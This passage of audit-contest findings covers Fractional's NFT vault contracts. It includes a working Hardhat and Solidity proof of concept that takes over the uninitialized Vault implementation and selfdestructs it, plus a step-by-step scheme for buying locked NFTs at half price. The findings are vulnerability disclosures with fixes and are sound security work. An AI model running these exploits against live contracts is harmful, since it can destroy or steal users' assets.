by depositing her 51 fraction tokens and 49 ether, making the `fractionPrice` 1 ether + Other users are satisfied with the provided price, and hence no one buys or sells their fraction tokens + The buyout succeeds:     + Alice gets the locked NFTs     + Other fraction holders can invoke `cash` to redeem their fraction tokens with a price of 1 ether + As a result, Alice paid 100 ether in total to get the locked NFTs.   ### Malicious Scenario  + Alice starts a buyout by depositing 0 fraction tokens and 1 wei, making the `fractionPrice` 0.01 wei.     + Note that Alice can create a separated account whose balance for the fraction token is 0, to start the buyout + No one is satisfied with the price (0.01 wei v/s 1 ether) and hence they will try to buy fraction tokens to reject the buyout     + Since there is not any fraction tokens locked in the `Buyout` contract from Alice, other users do not need to do anything + Alice invokes the `end` function     + But before invoking the `end` function, __Alice directly invokes `IERC1155(token).safeTransferFrom` to send the rest 51 fraction token to the `Buyout` contract__     + The `end` function will treat the buyout successful, since the `IERC1155(token).balanceOf(address(this), id)` is bigger than 50\\%     + The above two message calls happen in a single transaction, hence no one can front-run + As a result     + __Alice only paid 51 ether to get the locked NFTs whose value is 100 ether__     + __Other fraction holders get nothing (but they had paid for the fraction token before)__  In short, a malicious users can buy any NFT by just paying half of the NFT's market price  ### Suggested Fix  For each buyout, add a new field to record the amount of fraction tokens deposited by `sellFractions`. And in the `end` function, use the newly-added field to determine whether the buyout can be processed or not.  "}, {"title": "Migration.join() and Migration.leave() can still work after unsucessful migration.", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/250", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L105 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L141   # Vulnerability details  ## Impact Migration.join() and Migration.leave() can still work after unsucessful migration. As I submitted with my high-risk finding \"Migration.withdrawContribution() might work unexpectedly after unsuccessful migration.\", withdraw logic after unsuccessful migration is different from the initial leave() logic and the withdrawal logic would be messy if users call join() and leave() after unsuccessful migration.   ## Proof of Concept According to the [explanation](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L23), join() and leave() functions must be called for 7 days before commition.  Currently, such a scenario is possible.  - Alice creates a new migration and commits after some joins. - The migration ended unsuccessfully after 4 days. - Then users can call leave() or withdrawContribution() to withdraw their deposits but it wouldn't work properly because we should recalculate eth/fractional amounts with returned amounts after unsuccessful migration.   ## Tools Used Solidity Visual Developer of VSCode   ## Recommended Mitigation Steps We should add some restrictions to join() and leave() functions so that users can call these functions for 7 days before the migration is committed.  We should add these conditions to [join()](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L118) and [leave()](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L150).  ``` require(!migrationInfo[_vault][_proposalId].isCommited, \"committed already\"); require(block.timestamp <= proposal.startTime + PROPOSAL_PERIOD, \"proposal over\"); ```  "}, {"title": "Forced buyouts can be performed by malicious buyers", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/212", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L224-L238   # Vulnerability details  ## Impact In the end function of the Buyout contract, when the buyout fails, ERC1155 tokens are sent to the proposer. A malicious proposer can start a buyout using a contract that cannot receive ERC1155 tokens, and if the buyout fails, the end function fails because it cannot send ERC1155 tokens to the proposer. This prevents a new buyout from being started. ## Proof of Concept https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L224-L238 ## Tools Used None ## Recommended Mitigation Steps Consider saving the status of the proposer after a failed buyout and implementing functions to allow the proposer to withdraw the ERC1155 tokens and eth  "}, {"title": "Vault implementation can be destroyed leading to loss of all assets", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/200", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultFactory.sol#L19-L22 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L11-L25   # Vulnerability details   This is a basic uninitialized proxy bug, the `VaultFactory` creates a single implementation of `Vault` and then creates a proxy to that implementation every time a new vault needs to be deployed.  The problem is that that implementation vault is not initialized , which means that anybody can initialize the contract to become the owner, and then destroy it by doing a delegate call (via the `execute` function) to a function with the `selfdestruct` opcode. Once the implementation is destroyed all of the vaults will be unusable. And since there's no logic in the proxies to update the implementation - that means this is permanent (i.e. there's no way to call any function on any vault anymore, they're simply dead).  ## Impact This is a critical bug, since ALL assets held by ALL vaults will be lost. There's no way to transfer them out and there's no way to run any function on any vault.  Also, there's no way to fix the current deployed contracts (modules and registry), since they all depend on the factory vault, and there's no way to update them to a different factory. That means Fractional would have to deploy a new set of contracts after fixing the bug (this is a relatively small issue though).  ## Proof of Concept  I created the PoC based on the `scripts/deploy.js` file, here's a stripped-down version of that:  ```javascript const { ethers } = require(\"hardhat\");  const ZERO_ADDRESS = \"0x0000000000000000000000000000000000000000\";  async function main() {     const [deployer, attacker] = await ethers.getSigners();      // Get all contract factories     const BaseVault = await ethers.getContractFactory(\"BaseVault\");     const Supply = await ethers.getContractFactory(\"Supply\");     const VaultRegistry = await ethers.getContractFactory(\"VaultRegistry\");      // Deploy contracts      const registry = await VaultRegistry.deploy();     await registry.deployed();      const supply = await Supply.deploy(registry.address);     await supply.deployed();      // notice that the `factory` var in the original `deploy.js` file is a different factory than the registry's     const registryVaultFactory = await ethers.getContractAt(\"VaultFactory\", await registry.factory());      const implVaultAddress = await registryVaultFactory.implementation();     const vaultImpl = await ethers.getContractAt(\"Vault\", implVaultAddress);      const baseVault = await BaseVault.deploy(registry.address, supply.address);     await baseVault.deployed();     // proxy vault - the vault that's used by the user     let proxyVault = await deployVault(baseVault, registry, attacker);      const destructorFactory = await ethers.getContractFactory(\"Destructor\");     const destructor = await destructorFactory.deploy();       let destructData = destructor.interface.encodeFunctionData(\"destruct\", [attacker.address]);      const abi = new ethers.utils.AbiCoder();     const leafData = abi.encode([\"address\", \"address\", \"bytes4\"],         [attacker.address, destructor.address, destructor.interface.getSighash(\"destruct\")]);     const leafHash = ethers.utils.keccak256(leafData);      await vaultImpl.connect(attacker).init();      await vaultImpl.connect(attacker).setMerkleRoot(leafHash);     // we don't really need to do this ownership-transfer, because the contract is still usable till the end of the tx, but I'm doing it just in case     await vaultImpl.connect(attacker).transferOwnership(ZERO_ADDRESS);      // before: everything is fine     let implVaultCode = await ethers.provider.getCode(implVaultAddress);     console.log(\"Impl Vault code size before:\", implVaultCode.length - 2); // -2 for the 0x prefix     let owner = await proxyVault.owner();     console.log(\"Proxy Vault works fine, owner is: \", owner);       await vaultImpl.connect(attacker).execute(destructor.address, destructData, []);       // after: vault implementation is destructed     implVaultCode = await ethers.provider.getCode(implVaultAddress);     console.log(\"\\nVault code size after:\", implVaultCode.length - 2); // -2 for the 0x prefix      try {         owner = await proxyVault.owner();     } catch (e) {         console.log(\"Proxy Vault isn't working anymore.\", e.toString().substring(0, 300));     } }  async function deployVault(baseVault, registry, attacker) {     const nodes = await baseVault.getLeafNodes();      const tx = await registry.connect(attacker).create(nodes[0], [], []);     const receipt = await tx.wait();      const vaultEvent = receipt.events.find(e => e.address == registry.address);      const newVaultAddress = vaultEvent.args._vault;     const newVault = await ethers.getContractAt(\"Vault\", newVaultAddress);     return newVault; }   if (require.main === module) {     main() } ```  `Destructor.sol` file:  ```solidity // SPDX-License-Identifier: MIT pragma solidity 0.8.13;  contract Destructor{     function destruct(address payable dst) public {         selfdestruct(dst);     } } ```  Output: ``` Impl Vault code size before: 10386 Proxy Vault works fine, owner is:  0x5FbDB2315678afecb367f032d93F642f64180aa3  Vault code size after: 0 Proxy Vault isn't working anymore. Error: call revert exception [ See: https://links.ethers.org/v5-errors-CALL_EXCEPTION ] (method=\"owner()\", data=\"0x\", errorArgs=null, errorName=null, errorSignature=null, reason=null, code=CALL_EXCEPTION, version=abi/5.6.2) ```  Sidenote: as the comment in the code says, we don't really need to transfer the ownership to the zero address. It's just that Foundry's `forge` did revert the destruction when I didn't do it, with the error of `OwnerChanged` (i.e. once the `selfdestruct` was called the owner became the zero address, which is different than the original owner) so I decided to add this just in case. This is probably a bug in `forge`, since the contract shouldn't destruct till the end of the tx (Hardhat indeed didn't revert the destruction even when the attacker was the owner).  ## Tools Used Hardhat  ## Recommended Mitigation Steps    Add init in `Vault`'s constructor (and make the `init` function `public` instead of `external`):  ```solidity contract Vault is IVault, NFTReceiver {     /// @notice Address of vault owner     address public owner;     /// ...      constructor(){         // initialize implementation         init();     }      /// @dev Initializes nonce and proxy owner     function init() public {  ```  Alternately you can add init in `VaultFactory.sol` constructor, but I think initializing in the contract itself is a better practice.  ```solidity     /// @notice Initializes implementation contract     constructor() {         implementation = address(new Vault());         Vault(implementation).init();     }  ```    After mitigation the PoC will output this:  ``` Error: VM Exception while processing transaction: reverted with custom error 'Initialized(\"0xa16E02E87b7454126E5E10d957A927A7F5B5d2be\", \"0x70997970C51812dc3A010C7d01b50e0d17dc79C8\", 1)'     at Vault._execute (src/Vault.sol:124)     at Vault.init (src/Vault.sol:24)     at HardhatNode._mineBlockWithPendingTxs     .... ```  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/169", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "## Summary The developers have opted for a highly optimized and flexible smart contract architecture with the use of quite novel code (createWithImmutableArgs) and extensive assembly. However, as the developers are most likely fully aware, comes at the cost of much lower readability and can make the architecture and interdependence between different contracts quite confusing. I believe a small flow diagram to showcase how an example architecture would be deployed would be a massive help in understanding the architecture. On the other hand, the developers went above and beyond in commenting the code which was vitally important especially for such a complex architecture. In the future, I would be very careful when developing and adding new modules as in this case the contract is only as strong as its weakest link. When adding a new module, I would not only make sure that the module itself is secure but if it interacts with other modules then it does not introduce new vulnerabilities as the interdependence between modules is not always straightforward.  ### Issue #1 Incorrect memory expansion gas cost calculation Code used to calculate memory expansion cost is inconsistent with equation 326 in the [ethereum yellow paper](https://ethereum.github.io/yellowpaper/paper.pdf)  This can cause incorrect errors to be reported  Currently the code is `cost += (returnDataWords-msizeWords) * COST_PER_WORD + (returnDataWords**2 - msizeWords**2) / MEMORY_EXPANSION_COEFFICIENT` when it should be `cost += (returnDataWords-msizeWords) * COST_PER_WORD + (returnDataWords - msizeWords)**2 / MEMORY_EXPANSION_COEFFICIENT`  Change ```solidity                         cost := add(                             cost,                             add(                                 mul(                                     sub(returnDataWords, msizeWords),                                     COST_PER_WORD                                 ),                                 div(                                     sub(                                         mul(returnDataWords, returnDataWords),                                         mul(msizeWords, msizeWords)                                     ),                                     MEMORY_EXPANSION_COEFFICIENT                                 )                             )                         ) ``` to ```solidity                         cost := add(                             cost,                             add(                                 mul(                                     sub(returnDataWords, msizeWords),                                     COST_PER_WORD                                 ),                                 div(                                     mul(                                         sub(returnDataWords, msizeWords),                                         sub(returnDataWords, msizeWords)                                     ),                                     MEMORY_EXPANSION_COEFFICIENT                                 )                             )                         ) ```  Occurences: https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/targets/Supply.sol#L66-L81 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/targets/Supply.sol#L156-L171 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/targets/Transfer.sol#L96-L117 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/targets/Transfer.sol#L281-L296 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/targets/Transfer.sol#L412-L427 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/targets/Transfer.sol#L642-L657 ### Issue #2 Storage check in `_execute()` from Vault.sol is obselete Currently `_execute()` contains the line: ```solidity         if (owner_ != owner) revert OwnerChanged(owner_, owner); ``` to make sure that the owner storage variable is not modified after the delegatecall. This check can be easily bypassed by modifying the other storage variables such as `nonce` (allows a user to reinitalise contract), `merkleRoot` (user can execute malicious permissions) or `methods` (a malicious plugin can be installed)  1. Either you can trust that the `_target` contracts will all be stateless and just remove the check to save gas OR 2. add extra checks to include the other storage variables (recommended)  Occurences: https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L132 ### Issue #3 Use of magic values Throughout the contracts, there is an inconsistent use of magic values where sometimes constants are used and sometimes magic values are used  e.g. Change ```solidity         uint256 buyoutPrice = (msg.value * 100) /             (100 - ((depositAmount * 100) / totalSupply));         uint256 fractionPrice = buyoutPrice / totalSupply; ``` to ```solidity uint256 public immutable PRECISION = 100; ...         uint256 buyoutPrice = (msg.value * PRECISION) /             (PRECISION - ((depositAmount * PRECISION) / totalSupply));         uint256 fractionPrice = buyoutPrice / totalSupply; ```  Occurences: https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L86-L88 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L208-L211 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L451 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L199 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Minter.sol#L37 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L315 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L452 ### Issue #4 No check that `newVault` is not zero address in `migrateFractions()` In `migrateFractions()` from Migration.sol, the `newVault` address is read with no check that the address is not the zero address (which can occur if someone calls `migrateFractions()` before `settleVault()` is called). This causes the transaction to revert with no proper error message when the function attempts to send tokens.   Consider adding a check to produce a custom error if `newVault == address(0)`  Occurences: https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L466"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/158", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": " ## Gas Optimizations   | Optimizations | Occurances | | :--- | :---: | | 1. Variables can be made immutable | 8 | | 2. Use `calldata` instead of memory | 15 | | 3. Use ++i instead of i++ & Add `unchecked { ++i; }` in loops | 2 | | 4. Remove unnecessary variables | 3 | | 5. Use storage pointer to set value | 1 | | 6. Internal functions which are used only once can be inlined | 2 | | 7. Mark function calls from known callers as payable to bypass the check | 6 | | 8. Use `>>1` instead of `/2` | 3 | | 9. Add `unchecked` block for where arithmetic overflow cannot happen | 5 | | 10. Using `a = a + b` instead of `a += b` for state variables saves gas | 2 | | 11. Looking up array length from memory every time in a loop costs more gas | 1 | | | |   ### 1. Following variables can be made immutable.     * `registry` in the [BaseVault.sol]( https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/protoforms/BaseVault.sol#L19)   * `registry` in [Buyout.sol](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L29)   * `supply` in [Buyout.sol](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L31)   * `transfer` in [Buyout.sol](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L33)   * `supply` in [Minter.sol](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Minter.sol#L14)   * `buyout` in [Migration.sol](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L37)   * `registry` in [Migration.col](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L39)   * `implementation` in [VaultFactory.sol](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultFactory.sol#L15)   ### 2. Use `calldata` instead of memory in   * [FERC1155.sol#L68](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L68)   * [FERC1155.sol#L261](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L261)   * [FERC1155.sol#L83](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L83)   * [Vault.sol#L73](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L73)   * [Vault.sol#L101](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L101)   * [VaultRegistry.sol#L70](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L70)   * [VaultRegistry.sol#L71](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L71)   * [VaultRegistry.sol#L85](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L85)   * [VaultRegistry.sol#L86](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L86)   * [VaultRegistry.sol#L105](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L106)   * [VaultRegistry.sol#L150](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L150)   * [VaultRegistry.sol#L151](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L151)   * [VaultRegistry.sol#L168](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L168)   * [VaultRegistry.sol#L169](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L169)   * [Metadata.sol#L24](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/Metadata.sol#L24)  ### 3. Use `++i` instead of `i++` & Add `unchecked { ++i }` in all following for loops.   * [Vault.sol#L78](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L78)     ```diff     - for (uint256 i = 0; i < length; i++) {     -    methods[_selectors[i]] = _plugins[i];     - }     + for (uint256 i = 0; i < length; ) {     +    methods[_selectors[i]] = _plugins[i];     +    unchecked { ++i; }     + }               ```   * [Vault.sol#L104](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L104)     ```diff     - for (uint256 i = 0; i < length; i++) {     -     methods[_selectors[i]] = address(0);     - }     + for (uint256 i = 0; i < length; ) {     +     methods[_selectors[i]] = address(0);     +     unchecked { ++i; }     + }               ```  ### 4. Remove unnecessary variables:   * [VaultFactory.sol#L68](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultFactory.sol#L68) `data` is not necessary is variable      ```diff     - bytes memory data = abi.encodePacked();     - vault = implementation.clone(salt, data);     + vault = implementation.clone(salt, abi.encodePacked());         ```    * [Vault.sol#L60](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L60) `leaf` is not necessary and can be replaced by      ```diff     - bytes32 leaf = keccak256(abi.encode(msg.sender, _target, selector));     - if (!MerkleProof.verify(_proof, merkleRoot, leaf)) {         + if (!MerkleProof.verify(_proof, merkleRoot, keccak256(abi.encode(msg.sender, _target, selector)))) {     ```  * [VaultFactory#L46](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultFactory.sol#L46) 'data' is not necessary and can be replaced by      ```diff     - bytes32 data = keccak256(     -     abi.encodePacked(bytes1(0xff), address(this), salt, creationHash)     - );     - vault = address(uint160(uint256(data)));         + vault = address(uint160(uint256(keccak256(     +         abi.encodePacked(bytes1(0xff), address(this), salt, creationHash)     +     ))));     ```  ### 5. Use storage pointer to set value  * [Migration.sol#L279](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L279)      ```diff     -migrationInfo[_vault][_proposalId].fractionsMigrated = true;         +proposal.fractionsMigrated = true;             ```   <!-- ### 6. Internal functions which are used only once can be inlined   * https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L324   * https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L350 -->  ### 7. Mark function calls from known callers as payable to bypass the check * Functions with `onlyController` & `onlyRegistry` modifier in [FERC1155.sol](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol)       ```diff     - function setContractURI(string calldata _uri) external onlyController {     + function setContractURI(string calldata _uri) external payable onlyController {      - function setMetadata(address _metadata, uint256 _id) external onlyController {     + function setMetadata(address _metadata, uint256 _id) external payable onlyController {      - function setRoyalties( uint256 _id, address _receiver, uint256 _percentage ) external onlyController {      + function setRoyalties(uint256 _id, address _receiver, uint256 _percentage ) external payable onlyController {      - function transferController(address _newController) external onlyController {     + function transferController(address _newController) external payable onlyController {        - function burn(address _from, uint256 _id, uint256 _amount) external onlyRegistry {       + function burn(address _from, uint256 _id, uint256 _amount) external payable onlyRegistry {      - function mint(address _to, uint256 _id, uint256 _amount, bytes memory _data) external onlyRegistry {     + function mint(address _to, uint256 _id, uint256 _amount, bytes memory _data) external payable onlyRegistry {         ```       ### 8. Use `>> 1` instead of `/ 2` to save gas. Right shift x >> y is same as x / 2**y. * [MerkleBase.sol#L100](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L100)      ``` diff     - result = new bytes32[](length / 2 + 1);     + result = new bytes32[]((length >> 2) + 1);     .     .     - result = new bytes32[](length / 2);     + result = new bytes32[](length >> 2);     .     .     - _node = _node / 2;     + _node = _node >> 2;      ```  ### 9. Add `unchecked` block for where arithmetic overflow cannot happen * In `cash()` function in [Buyout.sol#L244](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L244):      ```diff     + unchecked {     +    uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault);     +    uint256 buyoutShare = (tokenBalance * ethBalance) /     +        (totalSupply + tokenBalance);     +    _sendEthOrWeth(msg.sender, buyoutShare);     +    // Emits event for cashing out of buyout pool     +    emit Cash(_vault, msg.sender, buyoutShare);     + }     ``` * In `sellFractions()` function in [Buyout.sol#L112](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L112)      ```diff     + unchecked {      +    uint256 endTime = startTime + PROPOSAL_PERIOD;     +    if (block.timestamp > endTime)     +        revert TimeExpired(block.timestamp, endTime);         + }  * In `buyFractions()` function in [Buyout.sol#L149](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L149)      ```diff     + unchecked {      +    uint256 endTime = startTime + REJECTION_PERIOD;     +    if (block.timestamp > endTime)     +        revert TimeExpired(block.timestamp, endTime);     + }     ```  * In `end()` function in [Buyout.sol#L184](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L184)      ```diff     + unchecked {      +    uint256 endTime = startTime + REJECTION_PERIOD;     +    if (block.timestamp <= endTime)     +        revert TimeNotElapsed(block.timestamp, endTime);     +     +    uint256 tokenBalance = IERC1155(token).balanceOf(address(this), id);     +    // Checks totalSupply of auction pool to determine if buyout is successful or not     +    if (     +        (tokenBalance * 1000) /     +            IVaultRegistry(registry).totalSupply(_vault) >     +        500     +    ) {     +        // Initializes vault transaction     +        bytes memory data = abi.encodeCall(     +            ISupply.burn,     +            (address(this), tokenBalance)     +        );     +        // Executes burn of fractional tokens from pool     +        IVault(payable(_vault)).execute(supply, data, _burnProof);     +        // Sets buyout state to successful     +        buyoutInfo[_vault].state = State.SUCCESS;     +        // Emits event for ending successful auction     +        emit End(_vault, State.SUCCESS, proposer);     +    } else {     +        // Deletes auction info     +        delete buyoutInfo[_vault];     +        // Transfers fractions and ether back to proposer of the buyout pool     +        IERC1155(token).safeTransferFrom(     +            address(this),     +            proposer,     +            id,     +            tokenBalance,     +            \"\"     +        );     +        _sendEthOrWeth(proposer, ethBalance);     +        // Emits event for ending unsuccessful auction     +        emit End(_vault, State.INACTIVE, proposer);     + }     ```  * In the `proposal()` function in [Migration.sol#L72](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L72)      ```diff     + unchecked {     +    Proposal storage proposal = migrationInfo[_vault][++nextId];     +    proposal.startTime = block.timestamp;     +    proposal.targetPrice = _targetPrice;     +    proposal.modules = _modules;     +    proposal.plugins = _plugins;     +    proposal.selectors = _selectors;     +    proposal.oldFractionSupply = IVaultRegistry(registry).totalSupply(     +        _vault     +    );     +    proposal.newFractionSupply = _newFractionSupply;         + }     ```  ### 10. Using `a = a + b` instead of `a += b` for state variables saves gas * In [Migration.sol#L123](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L123)    ```diff    - proposal.totalEth += msg.value;   + proposal.totalEth = proposal.totalEth + msg.value;       ```  * In [Migration.sol#L134](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L134)   ```diff    - proposal.totalFractions += msg.value;   + proposal.totalFractions = proposal.totalFractions + msg.value;     ```  ### 11. Looking up array length from memory every time in a loop costs more gas.  *  In [Buyout.sol#L454](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L454)     ```diff     - for (uint256 i; i < permissions.length; ) {     + uint256 length;         + for (uint256 i; i < length; ) {     ``` "}, {"title": "Migration fails when all tokens are joined", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/155", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/f862c14f86adf7de232cd4e9cca6b611e6023b98/src/modules/Migration.sol#L202 https://github.com/code-423n4/2022-07-fractional/blob/f862c14f86adf7de232cd4e9cca6b611e6023b98/src/modules/Migration.sol#L528   # Vulnerability details  ## Impact When `proposal.totalFractions` is equal to the total supply (meaning that all token holders want to participate in a migration), there is a division by zero in `_calculateTotal`.  In contrast to a buyout, where it does not make sense to initiate a buyout if all tokens are held (because there is a dedicated method for that), it does make sense to have a migration that all token holders join. Therefore, this case should be handled.  ## Proof Of Concept ```diff --- a/test/Migration.t.sol +++ b/test/Migration.t.sol @@ -238,7 +238,7 @@ contract MigrationTest is TestUtil {          // Bob joins the proposal          bob.migrationModule.join{value: 1 ether}(vault, 1, HALF_SUPPLY);          // Alice joins the proposal -        alice.migrationModule.join{value: 1 ether}(vault, 1, 1000); +        alice.migrationModule.join{value: 1 ether}(vault, 1, HALF_SUPPLY);           vm.warp(proposalPeriod + 1);          // bob calls commit to kickoff the buyout process ```  ## Recommended Mitigation Steps In such a case, `redeem` can be used instead of starting a buyout.  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/143", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "- For a migration, shouldn't it be sufficient if the currentPrice is greater than or equal to the target price? 